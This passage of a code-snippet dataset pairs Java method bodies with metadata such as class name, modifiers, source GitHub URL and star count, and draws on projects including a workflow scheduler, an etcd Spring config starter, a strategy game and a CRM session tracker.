jamiesjc: check executor capacity before polling from DB\n          final int execId = FlowRunnerManager.this.executorLoader\n              .selectAndUpdateExecution(this.executorId, FlowRunnerManager.this.active);\n          if (execId != -1) {\n            FlowRunnerManager.logger.info(\"Submitting flow \" + execId);\n            submitFlow(execId);\n            commonMetrics.markDispatchSuccess();\n          }\n        } catch (final Exception e) {\n          FlowRunnerManager.logger.error(\"Failed to submit flow \", e);\n          commonMetrics.markDispatchFail();\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 55947, "method_name": "shutdown", "class_name": "PollingService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n      this.scheduler.shutdown();\n      this.scheduler.shutdownNow();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 55948, "method_name": "registerBeanDefinitions", "class_name": "EtcdConfigBeanDefinitionRegistrar", "params": ["AnnotationMetadata", "BeanDefinitionRegistry"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) {\n\n        registerCommon(registry);\n        registerProcessor(registry);\n    }", "url": "https://raw.githubusercontent.com/zzl520/etcd-config-spring-boot-starter/master/src/main/java/com/zzl/etcd/config/component/EtcdConfigBeanDefinitionRegistrar.java", "stars": "4", "class_props": {"extends": null, "implements": ["ImportBeanDefinitionRegistrar"], "modifiers": ["public"]}}, {"id": 55949, "method_name": "registerCommon", "class_name": "EtcdConfigBeanDefinitionRegistrar", "params": ["BeanDefinitionRegistry"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void registerCommon(BeanDefinitionRegistry registry) {\n        registerInfrastructureBeanIfAbsent(registry, EtcdConfigServiceImpl.BEAN_NAME, EtcdConfigServiceImpl.class);\n        registerInfrastructureBeanIfAbsent(registry, EtcdComponent.BEAN_NAME, EtcdComponent.class);\n    }", "url": "https://raw.githubusercontent.com/zzl520/etcd-config-spring-boot-starter/master/src/main/java/com/zzl/etcd/config/component/EtcdConfigBeanDefinitionRegistrar.java", "stars": "4", "class_props": {"extends": null, "implements": ["ImportBeanDefinitionRegistrar"], "modifiers": ["public"]}}, {"id": 55950, "method_name": "registerProcessor", "class_name": "EtcdConfigBeanDefinitionRegistrar", "params": ["BeanDefinitionRegistry"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void registerProcessor(BeanDefinitionRegistry registry) {\n        registerInfrastructureBeanIfAbsent(registry, EtcdPropertySourcePostProcessor.BEAN_NAME, EtcdPropertySourcePostProcessor.class);\n        registerInfrastructureBeanIfAbsent(registry, EtcdValueAnnotationBeanPostProcessor.BEAN_NAME, EtcdValueAnnotationBeanPostProcessor.class);\n        registerInfrastructureBeanIfAbsent(registry, EtcdConfigurationPropertiesBindingPostProcessor.BEAN_NAME, EtcdConfigurationPropertiesBindingPostProcessor.class);\n        registerInfrastructureBeanIfAbsent(registry, EtcdConfigListenerMethodProcessor.BEAN_NAME, EtcdConfigListenerMethodProcessor.class);\n\n    }", "url": "https://raw.githubusercontent.com/zzl520/etcd-config-spring-boot-starter/master/src/main/java/com/zzl/etcd/config/component/EtcdConfigBeanDefinitionRegistrar.java", "stars": "4", "class_props": {"extends": null, "implements": ["ImportBeanDefinitionRegistrar"], "modifiers": ["public"]}}, {"id": 55951, "method_name": "registerInfrastructureBeanIfAbsent", "class_name": "EtcdConfigBeanDefinitionRegistrar", "params": ["BeanDefinitionRegistry", "String", "Class<?>"], "throws": null, "modifiers": ["static", "private"], "return_type": "void", "snippet": "    private static void registerInfrastructureBeanIfAbsent(BeanDefinitionRegistry registry, String beanName, Class<?> beanClass) {\n        if (!registry.containsBeanDefinition(beanName)) {\n            registerInfrastructureBean(registry, beanName, beanClass);\n        } else {\n            LOG.warn(\"register exists beanDefinition,beanName={}\", beanName);\n        }\n    }", "url": "https://raw.githubusercontent.com/zzl520/etcd-config-spring-boot-starter/master/src/main/java/com/zzl/etcd/config/component/EtcdConfigBeanDefinitionRegistrar.java", "stars": "4", "class_props": {"extends": null, "implements": ["ImportBeanDefinitionRegistrar"], "modifiers": ["public"]}}, {"id": 55952, "method_name": "registerInfrastructureBean", "class_name": "EtcdConfigBeanDefinitionRegistrar", "params": ["BeanDefinitionRegistry", "String", "Class<?>"], "throws": null, "modifiers": ["static", "private"], "return_type": "void", "snippet": "    private static void registerInfrastructureBean(BeanDefinitionRegistry registry, String beanName, Class<?> beanClass) {\n        BeanDefinitionBuilder beanDefinitionBuilder = BeanDefinitionBuilder.rootBeanDefinition(beanClass);\n        beanDefinitionBuilder.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);\n        registry.registerBeanDefinition(beanName, beanDefinitionBuilder.getBeanDefinition());\n    }", "url": "https://raw.githubusercontent.com/zzl520/etcd-config-spring-boot-starter/master/src/main/java/com/zzl/etcd/config/component/EtcdConfigBeanDefinitionRegistrar.java", "stars": "4", "class_props": {"extends": null, "implements": ["ImportBeanDefinitionRegistrar"], "modifiers": ["public"]}}, {"id": 55953, "method_name": "x", "class_name": "FleetOrders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float x()                         { return owningFleet.x(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55954, "method_name": "y", "class_name": "FleetOrders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float y()                         { return owningFleet.y(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55955, "method_name": "numAvailable", "class_name": "FleetOrders", "params": ["ShipDesign"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numAvailable(ShipDesign d)    { return num(d.id());  }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55956, "method_name": "newestOfType", "class_name": "FleetOrders", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ShipDesign", "snippet": "    public ShipDesign newestOfType(int type) { return newestOfMission(type); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55957, "method_name": "toString", "class_name": "FleetOrders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return concat(\"FleetOrders for dest:\", str(destSysId), \" fleet:\", owningFleet.toString());\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55958, "method_name": "reset", "class_name": "FleetOrders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {\n        if (owningFleet.inTransit())\n            destSysId = owningFleet.destSysId();\n        else\n            destSysId = owningFleet.sysId();\n\n        reassignedFleets.clear();\n        for (int i=0;i<num.length;i++)\n            num[i] = owningFleet.num(i);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55959, "method_name": "reassignShip", "class_name": "FleetOrders", "params": ["ShipDesign", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reassignShip(ShipDesign design, int destId, int numShips) {\n        int designId = design.id();\n        // keep track of any other ships from this fleet order going to the same\n        // dest so they can be combined into one fleet\n        int[] counts = new int[ShipDesignLab.MAX_DESIGNS];\n        counts[design.id()] = numShips;\n        galaxy().ships.deploySubfleet(owningFleet, counts, destId);\n        removeShips(designId, numShips);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55960, "method_name": "hasShips", "class_name": "FleetOrders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasShips() {\n        boolean res = false;\n        for (int i=0;i<num.length;i++)\n            res = res || num[i]>0;\n        return res;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55961, "method_name": "numStacks", "class_name": "FleetOrders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numStacks()                        { return num.length; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55962, "method_name": "num", "class_name": "FleetOrders", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int num(int designNum)                 { return num[designNum];  }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55963, "method_name": "addShips", "class_name": "FleetOrders", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addShips(int designNum, int n)    { num[designNum] += n; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55964, "method_name": "removeShips", "class_name": "FleetOrders", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeShips(int designNum, int n) { num[designNum] -= n; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55965, "method_name": "design", "class_name": "FleetOrders", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ShipDesign", "snippet": "    public ShipDesign design(int i) {\n        return owningFleet.empire().shipLab().design(i);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55966, "method_name": "newestOfMission", "class_name": "FleetOrders", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ShipDesign", "snippet": "    public ShipDesign newestOfMission(int type) {\n        ShipDesignLab lab = owningFleet.empire().shipLab();\n        ShipDesign newest = null;\n        for (int i=0;i<num.length;i++) {\n            if (num[i] > 0) {\n                ShipDesign des = lab.design(i);\n                if ((des != null) && (des.mission() == type)) {\n                    if ((newest == null) || (newest.seq() < des.seq()))\n                        newest = des;\n                }\n            }\n        }\n        return newest;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/FleetOrders.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55967, "method_name": "getJspFile", "class_name": "SetStatusStep", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getJspFile() {\n        return \"/WEB-INF/jspf/usermob/process/process/wizard/step_set_status.jsp\";\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/wizard/SetStatusStep.java", "stars": "12", "class_props": {"extends": "Step", "implements": null, "modifiers": ["public"]}}, {"id": 55968, "method_name": "newStepData", "class_name": "SetStatusStep", "params": ["WizardData"], "throws": null, "modifiers": ["public"], "return_type": "SetStatusStepData", "snippet": "    public SetStatusStepData newStepData(WizardData data) {\n        return new SetStatusStepData(this, data);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/wizard/SetStatusStep.java", "stars": "12", "class_props": {"extends": "Step", "implements": null, "modifiers": ["public"]}}, {"id": 55969, "method_name": "getLoginStat", "class_name": "LoginStat", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "LoginStat", "snippet": "\tpublic static LoginStat getLoginStat() {\n\t\tif (loginStat == null) {\n\t\t\tloginStat = new LoginStat();\n\t\t}\n\n\t\treturn loginStat;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55970, "method_name": "userLoggedIn", "class_name": "LoginStat", "params": ["HttpSession", "User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void userLoggedIn(HttpSession session, User user) {\n\t\tsynchronized (sessionMap) {\n\t\t\tif (session != null && user != null) {\n\t\t\t\tsessionMap.put(session.getId(), new SessionData(user));\n\t\t\t\tloggedUserIds = updateUserLoggedList();\n\n\t\t\t\tif (log.isDebugEnabled()) {\n\t\t\t\t\tlog.debug(\"User logged: \" + user + \"; userList size: \" + loggedUserIds.size() + \"; session: \"\n\t\t\t\t\t\t\t+ session.getId());\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55971, "method_name": "sessionClosed", "class_name": "LoginStat", "params": ["HttpSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void sessionClosed(HttpSession session) {\n\t\tsynchronized (sessionMap) {\n\t\t\tif (sessionMap != null && session != null) {\n\t\t\t\tSessionData data = sessionMap.remove(session.getId());\n\t\t\t\tloggedUserIds = updateUserLoggedList();\n\n\t\t\t\tif (data != null && log.isDebugEnabled()) {\n\t\t\t\t\tlog.debug(\"User session closed: \" + data.user + \"; userList size: \" + loggedUserIds.size());\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55972, "method_name": "updateUserLoggedList", "class_name": "LoginStat", "params": [], "throws": null, "modifiers": ["private"], "return_type": "List<Integer>", "snippet": "\tprivate List<Integer> updateUserLoggedList() {\n\t\tSet<Integer> result = new LinkedHashSet<Integer>();\n\n\t\tfor (SessionData data : sessionMap.values()) {\n\t\t\tresult.add(data.user.getId());\n\t\t}\n\n\t\treturn new ArrayList<Integer>(result);\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55973, "method_name": "actionWasCalled", "class_name": "LoginStat", "params": ["HttpSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void actionWasCalled(HttpSession session) {\n\t\tSessionData data = sessionMap.get(session.getId());\n\t\tif (data != null) {\n\t\t\tdata.lastActive = System.currentTimeMillis();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55974, "method_name": "isSessionValid", "class_name": "LoginStat", "params": ["HttpSession"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isSessionValid(HttpSession session) {\n\t\tif (sessionTimeout > 0) {\n\t\t\tSessionData data = sessionMap.get(session.getId());\n\t\t\tif (data != null && (data.lastActive + sessionTimeout < System.currentTimeMillis())) {\n\t\t\t\tif (log.isDebugEnabled()) {\n\t\t\t\t\tlog.debug(\"User session invalid by timeout: \" + data.user + \"; userList size: \"\n\t\t\t\t\t\t\t+ loggedUserIds.size());\n\t\t\t\t}\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55975, "method_name": "getLoggedUserList", "class_name": "LoginStat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<User>", "snippet": "\tpublic List<User> getLoggedUserList() {\n\t\treturn JSPFunction.getObjectList(UserCache.getUserMap(), loggedUserIds);\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55976, "method_name": "getLoggedUserWithSessions", "class_name": "LoginStat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LinkedHashMap<User,List>", "snippet": "\tpublic LinkedHashMap<User, List<SessionData>> getLoggedUserWithSessions() {\n\t\tLinkedHashMap<User, List<SessionData>> result = new LinkedHashMap<User, List<SessionData>>();\n\n\t\tfor (SessionData data : sessionMap.values()) {\n\t\t\tUser user = data.user;\n\n\t\t\tList<SessionData> userSessions = result.get(user);\n\t\t\tif (userSessions == null) {\n\t\t\t\tresult.put(user, userSessions = new ArrayList<SessionData>());\n\t\t\t}\n\n\t\t\tuserSessions.add(data);\n\t\t}\n\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55977, "method_name": "getUser", "class_name": "SessionData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "User", "snippet": "\t\tpublic User getUser() {\n\t\t\treturn user;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55978, "method_name": "getLoginTime", "class_name": "SessionData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\t\tpublic Date getLoginTime() {\n\t\t\treturn loginTime;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55979, "method_name": "getLastActiveTime", "class_name": "SessionData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\t\tpublic Date getLastActiveTime() {\n\t\t\treturn new Date(lastActive);\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/LoginStat.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55980, "method_name": "resolveLocale", "class_name": "CustomLocaleResolver", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "Locale", "snippet": "    public Locale resolveLocale(HttpServletRequest request) {\n        String lang = request.getHeader(localeHeader);\n        Locale locale = Locale.getDefault();\n        if(StringUtils.isNotBlank(lang)){\n            if(lang.contains(SPLIT_SPOT)){\n                String str = lang.split(SPLIT_SPOT)[0];\n                locale = splitStr(str);\n            }else{\n                locale = splitStr(lang);\n            }\n        }\n        return locale;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/i18n/CustomLocaleResolver.java", "stars": "23", "class_props": {"extends": "AcceptHeaderLocaleResolver", "implements": null, "modifiers": ["public"]}}, {"id": 55981, "method_name": "splitStr", "class_name": "CustomLocaleResolver", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Locale", "snippet": "    private Locale splitStr(String str){\n        Locale locale;\n        if(str.contains(SPLIT_UNDERLINE)){\n            String[] language = str.split(SPLIT_UNDERLINE);\n            locale = new Locale(language[0],language[1]);\n        }else if(str.contains(SPLIT_LINE)){\n            String[] language = str.split(SPLIT_LINE);\n            locale = new Locale(language[0],language[1]);\n        }else {\n            locale = new Locale(str);\n        }\n        return locale;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/i18n/CustomLocaleResolver.java", "stars": "23", "class_props": {"extends": "AcceptHeaderLocaleResolver", "implements": null, "modifiers": ["public"]}}, {"id": 55982, "method_name": "getMinimumSize", "class_name": "ExecutionListPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Dimension", "snippet": "  public Dimension getMinimumSize() {\n    Dimension minSize = super.getMinimumSize();\n    minSize.width = 150;\n    return minSize;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ExecutionListPanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": null, "modifiers": ["public"]}}, {"id": 55983, "method_name": "createButtons", "class_name": "ExecutionListPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JPanel", "snippet": "  private JPanel createButtons() {\n    JPanel panel = new JPanel(new GridLayout(1, 4, 4, 4));\n    panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 0, 2));\n    JButton add = new JButton(\"Add\", IconLoader.get().loadSVGIcon(\"res/add.svg\", false));\n    add.addActionListener(e -> {\n      ExecutionSelection es = new ExecutionSelection(ExecutionListPanel.this);\n      es.setVisible(true);\n      ExecutionTreeNode root = ((ExecutionTreeNode) model.getRoot());\n      if (es.tree.getSelectionPath() == null) {\n        ExecutionTreeNode node = (ExecutionTreeNode) es.tree.getLastSelectedPathComponent();\n        if (node != null && node.member != null) {\n          root.add(new ExecutionTreeNode(node.member, true));\n        }\n      } else {\n        for (TreePath path : es.tree.getSelectionPaths()) {\n          ExecutionTreeNode node = (ExecutionTreeNode) path.getLastPathComponent();\n          if (node != null && node.member != null) {\n            root.add(new ExecutionTreeNode(node.member, true));\n          }\n        }\n      }\n      model.reload();\n      executions.repaint();\n    });\n    panel.add(add);\n    remove = new JButton(\"Remove\", IconLoader.get().loadSVGIcon(\"res/remove.svg\", false));\n    remove.addActionListener(e -> {\n      ExecutionTreeNode node = (ExecutionTreeNode) executions.getLastSelectedPathComponent();\n      if (node != null && node.member != null) {\n        model.removeNodeFromParent(node);\n        model.reload();\n        executions.repaint();\n      }\n    });\n    panel.add(remove);\n    remove.setEnabled(false);\n    up = new JButton(\"Move up\", IconLoader.get().loadSVGIcon(\"res/move_up.svg\", false));\n    up.addActionListener(e -> {\n      Utils.moveTreeItem(executions, -1);\n      executions.grabFocus();\n    });\n    panel.add(up);\n    up.setEnabled(false);\n    down = new JButton(\"Move down\", IconLoader.get().loadSVGIcon(\"res/move_down.svg\", false));\n    down.addActionListener(e -> {\n      Utils.moveTreeItem(executions, 1);\n      executions.grabFocus();\n    });\n    panel.add(down);\n    down.setEnabled(false);\n    return panel;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ExecutionListPanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": null, "modifiers": ["public"]}}, {"id": 55984, "method_name": "getExecutions", "class_name": "ExecutionListPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Execution>", "snippet": "  public ArrayList<Execution> getExecutions() {\n    ArrayList<Execution> list = new ArrayList<>();\n    ExecutionTreeNode root = (ExecutionTreeNode) model.getRoot();\n    for (int i = 0; i < root.getChildCount(); i++) {\n      ExecutionTreeNode child = (ExecutionTreeNode) root.getChildAt(i);\n      assert (child.member != null);\n      list.add(child.member);\n    }\n    return list;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ExecutionListPanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": null, "modifiers": ["public"]}}, {"id": 55985, "method_name": "main", "class_name": "UserApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(UserApplication.class, args);\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_user/src/main/java/com/tensquare/user/UserApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55986, "method_name": "idWorker", "class_name": "UserApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IdWorker", "snippet": "\tpublic IdWorker idWorker(){\n\t\treturn new IdWorker(1, 1);\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_user/src/main/java/com/tensquare/user/UserApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55987, "method_name": "encoder", "class_name": "UserApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BCryptPasswordEncoder", "snippet": "    public BCryptPasswordEncoder encoder() {\n\t    return new BCryptPasswordEncoder();\n    }", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_user/src/main/java/com/tensquare/user/UserApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55988, "method_name": "jwtUtil", "class_name": "UserApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JwtUtil", "snippet": "    public JwtUtil jwtUtil() {\n\t    return new JwtUtil();\n    }", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_user/src/main/java/com/tensquare/user/UserApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55989, "method_name": "setTitle", "class_name": "FundRecordBean", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55990, "method_name": "getTitle", "class_name": "FundRecordBean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55991, "method_name": "setStatus", "class_name": "FundRecordBean", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(int status) {\n        this.status = status;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55992, "method_name": "getStatus", "class_name": "FundRecordBean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55993, "method_name": "setNum", "class_name": "FundRecordBean", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNum(int num) {\n        this.num = num;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55994, "method_name": "getNum", "class_name": "FundRecordBean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNum() {\n        return num;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55995, "method_name": "setTime", "class_name": "FundRecordBean", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTime(long time) {\n        this.time = time;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55996, "method_name": "getTime", "class_name": "FundRecordBean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getTime() {\n        return time;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55997, "method_name": "setMessage", "class_name": "FundRecordBean", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMessage(String message) {\n        this.message = message;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55998, "method_name": "getMessage", "class_name": "FundRecordBean", "params": [], "throws": null, "modifiers": ["public"], "return_type": 